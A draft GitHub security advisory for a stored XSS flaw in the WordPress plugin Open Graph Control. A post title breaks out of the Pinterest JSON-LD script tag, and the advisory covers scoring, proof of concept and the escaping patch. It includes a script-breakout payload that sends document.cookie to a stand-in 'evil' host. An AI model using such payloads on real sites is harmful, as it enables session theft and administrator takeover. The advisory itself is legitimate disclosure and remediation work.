# GitHub Security Advisory — draft text

Publish manually via GitHub UI:

<https://github.com/Teriffy/open-graph-control/security/advisories/new>

---

## Title
Stored XSS via JSON-LD `<script>` breakout in Pinterest Rich Pins payload

## Ecosystem
- Package ecosystem: **WordPress Plugin**
- Package name: `open-graph-control`

## Severity
**High** (CVSS v3.1: **8.1 / High**)

Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L`

| Metric | Value | Reason |
|---|---|---|
| AV — Attack Vector | Network | Delivered by visiting the compromised post on the public frontend |
| AC — Attack Complexity | Low | Single post-title write; no race or timing |
| PR — Privileges Required | Low | WP Author role (publish-own-posts) |
| UI — User Interaction | Required | Victim must load the post page (admin browsing the site hits this) |
| S — Scope | Changed | Script executes in admin's session when they visit |
| C — Confidentiality | High | Session cookie exfiltration → full WP takeover |
| I — Integrity | High | XSS can trigger authenticated admin actions |
| A — Availability | Low | Denial via destructive admin calls from XSS is possible but not primary |

## Affected versions
`< 0.2.1`

Specifically: every published 0.2.x development preview before 0.2.1.
The 0.0.x and 0.1.x snapshots are also affected but were never
recommended for production.

## Patched versions
`>= 0.2.1`

## Description

The plugin's Pinterest Rich Pins platform (`src/Platforms/Pinterest.php`)
built a JSON-LD payload for the `<script type="application/ld+json">`
tag it emits into `<head>` on every singular page. The payload was
encoded with:

```php
wp_json_encode( $payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
```

`JSON_UNESCAPED_SLASHES` keeps `/` as `/`, and the default flags do NOT
escape `<` or `>`. As a result, any string value inside the payload —
most importantly the post title, which flows in via
`$this->title->resolve( $context )` — was emitted inside the `<script>`
tag with its `<` and `>` characters intact.

A user with WordPress's **Author** role (which grants
`publish_posts` on their own posts) could set a post title like:

```
Hello</script><img src=x onerror=fetch('https://evil/?c='+document.cookie)>
```

When any visitor (including an administrator browsing the published
post) loaded that page, the browser's HTML parser saw the attacker-
controlled `</script>` sequence, closed the wrapping JSON-LD tag early,
and parsed the remainder as HTML. The injected `<img onerror>` executed
JavaScript in the visitor's origin, with full access to their
authentication cookies for `wp-admin`. Administrator cookies → site
takeover.

The same sink was also reachable via:

- The post **author's `display_name`** (stored in `article.author.name`
  in the JSON-LD), which any user can edit for themselves on their
  profile screen.
- The post **description / excerpt / content** through the
  `description` resolver chain.
- Any filter hooked into `ogc_pinterest_rich_pin_payload` or
  `ogc_resolve_*_value` that returned unsanitised content.

The per-field `esc_attr()` wrapping around the `<meta>` tag output
correctly prevented XSS in HTML-attribute contexts, so the issue was
isolated to the JSON-LD script-tag context.

## Impact

A low-privilege authenticated user (WP Author role) can achieve
**stored XSS that executes in the browser session of any front-end
visitor**, including administrators. Successful exploitation leads to
administrator cookie theft and full site takeover.

Prerequisites:

1. The plugin is active.
2. Pinterest platform is enabled in settings (**default: off** on
   first install; **on** for sites that have explicitly enabled
   Pinterest Rich Pins).
3. Attacker has at least WP Author role and at least one published
   post.

## Proof of concept

1. Install and activate Open Graph Control `<= 0.2.0`.
2. In Settings → Platforms, enable Pinterest with any Rich Pins
   schema.
3. Log in as a user with the **Author** role.
4. Create a new post with title:
   `Hello</script><img src=x onerror=alert(1)>`
5. Publish.
6. Load the public post URL. An `alert(1)` dialog fires.

Before 0.2.1 the rendered JSON-LD was literally:

```html
<script type="application/ld+json">{"headline":"Hello</script><img src=x onerror=alert(1)>"}</script>
```

The browser terminated the first `<script>` at the attacker's
`</script>` and then parsed the remaining string as HTML.

After 0.2.1 it is:

```html
<script type="application/ld+json">{"headline":"Hello\u003c\/script\u003e\u003cimg src=x onerror=alert(1)\u003e"}</script>
```

`<` and `>` are encoded as `\u003c` / `\u003e` by `JSON_HEX_TAG`, so no
tag closer reaches the parser.

## Patch

Commit: [`d330319`](https://github.com/Teriffy/open-graph-control/commit/d330319)

Three layered fixes:

1. `Pinterest::json_ld()` now encodes with
   `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT |
   JSON_UNESCAPED_UNICODE`. `<`, `>`, `&`, `'`, `"` inside JSON strings
   are all escaped to their `\uXXXX` forms.
2. `Head::render()` additionally runs
   `str_replace( '</', '<\/', $payload )` before emission as a
   belt-and-suspenders guard, so any future platform class that
   forgets the flags still can't close the wrapping `<script>` tag.
3. `Image::from_content_img()` routes extracted URLs through
   `esc_url_raw()`, which rejects any protocol not in
   `wp_allowed_protocols()` (notably `javascript:`, `data:`,
   `vbscript:`).

PHPUnit regression tests cover all three fixes. Live end-to-end
verification performed against wp-env.

## Credit

Reported and fixed internally during pre-wordpress.org-submission
audit.

## References

- Commit: https://github.com/Teriffy/open-graph-control/commit/d330319
- Release: https://github.com/Teriffy/open-graph-control/releases/tag/v0.2.1
- PHP JSON encoding flags: https://www.php.net/manual/en/json.constants.php
- OWASP: Output Encoding for JavaScript Contexts
